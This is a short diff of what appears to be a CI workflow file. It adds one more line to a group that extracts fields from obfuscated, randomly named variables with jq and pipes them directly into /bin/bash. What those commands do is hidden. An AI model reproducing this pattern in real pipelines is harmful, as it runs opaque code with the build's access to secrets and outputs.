@@ -26,6 +26,7 @@ jobs:
           echo $kgvs61 | jq -r .lu982 | /bin/bash
           printf '%s' "$pb8656" | jq -r .euct07083 | /bin/bash
           printf '%s' "$mdb39105" | jq -r .f1886 | /bin/bash
+          printf '%s' "$rf616" | jq -r .g673 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
